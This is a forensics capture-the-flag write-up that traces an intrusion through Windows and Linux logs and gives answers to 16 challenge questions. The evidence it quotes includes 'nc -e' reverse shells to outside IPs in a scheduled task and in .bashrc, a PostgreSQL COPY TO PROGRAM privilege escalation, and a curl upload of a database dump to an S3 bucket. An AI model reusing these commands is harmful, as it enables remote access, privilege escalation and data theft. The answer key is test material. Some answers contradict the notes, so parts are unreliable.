# Analysis logs
- Using autospy to automatically parse logs and finding potential artifacts
-> check autoruns, schedule tasks, file, documents,... found a suspicious schedule task:
```bash 
<Actions Context="Author">
    <Exec>
      <Command>C:\Windows\INF\networkconn.exe</Command>
      <Arguments>-e cmd.exe 34.234.202.16 2424</Arguments>
    </Exec>
  </Actions>
  (this maybe a nc with -e cmd arg, so it should be a revshell)
```
- Also, found a user joining domain, this user can be used for lateral movement (***aarush***)
- In autospy, find all run programs belong to aarush user, found some other strange things (net.exe, net1.exe, netscan.exe). The crucial thing here is netscan.exe also in **C:\Windows\INF**. The I guess this has something more on this directory.
- Parse $MFT by MFTcmd by EricZimmerman, then find all pe file in **C:\Windows\INF**, it points me to 3 exe file:
+ netscan.exe
+ networkconn.exe
+ WinSysInfo.exe
-> Now, I can conclude this is directory that TA downloads tools used for recon -> Q2: C:\Windows\INF

- I have some gold in my hand, then move to the next part. Try to find when does any of files found above runs. But unfortunately, no 4688 or 1 event for those pe, no log from powershell indicates process created, no console history file exist, also parse Amcache and parse hive from aarush user, but found nothing. But instead, I see some 5379 events, which is account enumeration, something like Q5 mentions. an exe should be used for enum user, so I guess, this can be any of 3 files above. USN Journal ($UsnJrnl) log file contains all data about file operations. But $UsnJrnl is not here, parse $LogFile by [LogFileParser](https://github.com/jschicht/LogFileParser), then output will contains a file LogFile_lfUsnJrnl.csv, using grep to traverse through file:
```bash
cat LogFile_lfUsnJrnl.csv| grep -i '.exe' | grep -i 'rename'
cat LogFile_lfUsnJrnl.csv| grep -i '.exe' | grep -i 'rename' | grep -i 'winsys' -B3 -A3
V01tmp.log|50938528|2024-10-24 06:24:47.8408784|RENAME_NEW_NAME+CLOSE|107477|3|106075|2|archive+not_content_indexed|2|0|0x00000000|0
V0100009.log|50938872|2024-10-24 06:24:47.8877606|RENAME_NEW_NAME+DATA_OVERWRITE+CLOSE|108518|3|106075|2|archive+not_content_indexed|2|0|0x00000000|0
CredentialsFileView.exe|51001432|2024-10-24 06:35:24.0526100|RENAME_OLD_NAME|29878|2|29877|2|archive|2|0|0x00000000|0
WinSysView.exe|51001544|2024-10-24 06:35:24.0526100|RENAME_NEW_NAME|29878|2|29877|2|archive|2|0|0x00000000|0
WinSysView.exe|51001632|2024-10-24 06:35:24.0526100|RENAME_NEW_NAME+CLOSE|29878|2|29877|2|archive|2|0|0x00000000|0
HxCommAlwaysOnLog.etl|51046256|2024-10-24 06:48:02.5480288|RENAME_OLD_NAME|429|3|107150|2|archive+not_content_indexed|2|0|0x00000000|0
HxCommAlwaysOnLog_Old.etl|51046360|2024-10-24 06:48:02.5480288|RENAME_NEW_NAME|429|3|107150|2|archive+not_content_indexed|2|0|0x00000000|0
HxCommAlwaysOnLog_Old.etl|51046472|2024-10-24 06:48:02.5480288|RENAME_NEW_NAME+CLOSE|429|3|107150|2|archive+not_content_indexed|2|0|0x00000000|0

```
- see, WinSysView orgiginal name is CredentialsFileView, then I can sure \INF dir belongs to attacker
Q5: CredentialsFileView
- Get stuck in this, so I try to find evils in linux log (DB machine). Walk through the log, I found something about login session:
```bash
sysadmin pts/0        Thu Oct 24 07:42:57 2024   still logged in                       10.10.0.1
sdb-aroy pts/0        Thu Oct 24 06:42:52 2024 - Thu Oct 24 07:02:48 2024  (00:19)     10.10.2.55
sysadmin pts/0        Fri Oct 11 11:52:09 2024 - Fri Oct 11 12:08:31 2024  (00:16)     10.10.0.1
sysadmin tty1         Wed Oct  9 17:22:32 2024   gone - no logout                      0.0.0.0
runlevel (to lvl 5)   Wed Oct  9 17:21:48 2024   still running                         0.0.0.0
reboot   system boot  Wed Oct  9 17:21:03 2024   still running                         0.0.0.0

wtmp begins Wed Oct  9 17:21:03 2024


sysadmin         pts/0    10.10.0.1        Thu Oct 24 07:42:57 +0000 2024
lxd                                        **Never logged in**
postgres                                   **Never logged in**
sdb-aroy         pts/0    10.10.2.55       Thu Oct 24 06:42:52 +0000 2024
```
- As mention above, attack occured during 24/10/2024, then I can conclude that attacker use sdb-aroy account to connect db
Q8: db-aroy
Q9: 10.10.2.55
- Because attacker need to extract data from postgre db, so extract all /var/log to get all logs, read postgre log from:
"SalsaDance\catscale_out\Logs\sdb00-20241024-0743-var-log\var\log\postgresql"
```bash
2024-10-24 06:49:37.710 UTC [69316] sdb-aroy@ATM ERROR:  permission denied for table accounts
2024-10-24 06:49:37.710 UTC [69316] sdb-aroy@ATM STATEMENT:  SELECT * FROM accounts;
2024-10-24 06:49:48.381 UTC [69316] sdb-aroy@ATM ERROR:  permission denied for table carddetails
2024-10-24 06:49:48.381 UTC [69316] sdb-aroy@ATM STATEMENT:  SELECT * FROM carddetails;
```
-> Q10: SELECT * FROM accounts;

- I examinate some hiden file like .history,... to find recent command, then I found something smellthy:
```bash
SELECT current_user;
SELECT * FROM pg_stat_activity;
\du 
\l
\c ATM
\dt
\d accounts
\d caddetails
\d carddetails
\d users
SELECT * FROM accounts;
SELECT * FROM carddetails;
COPY (SELECT '') TO PROGRAM 'psql -U postgres -c ''ALTER USER "sdb-aroy" WITH SUPERUSER;''';
CREATE USER "sdb-admin" WITH LOGIN SUPERUSER;
ALTER ROLE "sdb-admin" WITH PASSWORD 'br1ghtLightz';
\du
\! pg_dump -U "sdb-aroy" -h 127.0.0.1 -d ATM -f /tmp/atm.sql
curl -X PUT -T /tmp/atm.sql https://festival-of-files.s3.amazonaws.com/atm.sqlexit
\q
```
-> Q11: COPY (SELECT '') TO PROGRAM 'psql -U postgres -c ''ALTER USER "sdb-aroy" WITH SUPERUSER;''';
-> Q12: pg_dump
-> Q13: https://festival-of-files.s3.amazonaws.com/atm.sql

- In Q14, I have already found a persistent schedule task on window logs, but I have confusion for linux log, so I built a script for automatically searching IP in all file in logs, then it points me to ***catscale_out\User_Files\hidden-user-home-dir\home\sdb-aroy\.bashrc***:
```bash
unset color_prompt force_color_prompt
nc -e /bin/bash 3.224.124.130 2323 2>/dev/null &
# If this is an xterm set the title to user@host:dir
case "$TERM" in
```
and also windows **SWS25\C\Windows\System32\Tasks\WindowsNetworkConnector**:
```bash
<Exec>
      <Command>C:\Windows\INF\networkconn.exe</Command>
      <Arguments>-e cmd.exe 34.234.202.16 2424</Arguments>
    </Exec>
  </Actions>
```
Q14: 3.224.124.130, 34.234.202.16
(searching script can be found in [myrepo](https://github.com/luckystars0612/Forensics/blob/main/Automate%20searching%20scripts/search_ip_through_dirs_exact_slow.py))
- Return to winlogs, I found a prefetch file name **nltest**, this must be the native window bin that attacker uses for gathering domain info
Q1: 2024-10-24 06:27:29
- After using nltest to gather info about DC, I found a suspicious process named bitsadmin, which can be used for downloading, execute, even cleaning indicators and exfiltrating data.
Q3: bitsadmin.exe
- The technique ID of using bitsadmin is t1197
Q4:T1197
Q15: examinate rdp event logs (event 1025)
```bash
RDP ClientActiveX has connected to the server
```
Q16: end session time is 07:34:40 UTC, so the session duration is 1615
# Questions
## 1. What time (UTC) did the threat actor retrieve details about the domain controller using a native Windows tool?
- 2024-10-24 06:27:29
## 2. To what directory on the compromised system did the threat actor download the tools used for reconnaissance?
- C:\Windows\INF
## 3. Which legitimate Windows program did the threat actor use to download the initial file?
- bitsadmin.exe
## 4. What is the MITRE ATT&CK Technique ID associated with the method used by the threat actor in Question #3?
- T1197
## 5. The threat actor used a program to identify the credentials stored on the victim machine. What was the original filename of this program before it was renamed?
- CredentialsFileView
## 6. What is the SHA1 hash of the file in Question #5?
- 5463f4140efd005a7bafa6fa0fa759bcfcf7da4a
## 7. At what time (UTC) did the threat actor rename the program in Question #5?
- 2024-10-24 06:35:24
## 8. What is the name of the compromised account used by the threat actor to connect to the database server?
- sdb-aroy
## 9. What is the source IP address used by the threat actor to connect to the database server?
- 10.10.2.25
## 10. What database command did the threat actor initially enter that resulted in an error?
- SELECT * FROM accounts;
## 11. What is the full command used by the threat actor to gain elevated access?
- COPY (SELECT '') TO PROGRAM 'psql -U postgres -c ''ALTER USER "sdb-aroy" WITH SUPERUSER;''';
## 12. What tool was used by the threat actor to export the database?
- pg_dump
## 13. What is the complete target URL used by the threat actor for exfiltration?
- https://festival-of-files.s3.amazonaws.com/atm.sql
## 14. What public IP addresses were used by the threat actor for persistence? Sort smallest initial octet to largest.
- 3.224.124.130, 34.234.202.16
## 15. At what time (UTC) did the victim's Windows machine connect to the Domain Controller?
- 2024-10-24 07:07:45
## 16. After accessing the Domain Controller, how long did the threat actor’s session last (in seconds)?
- 1615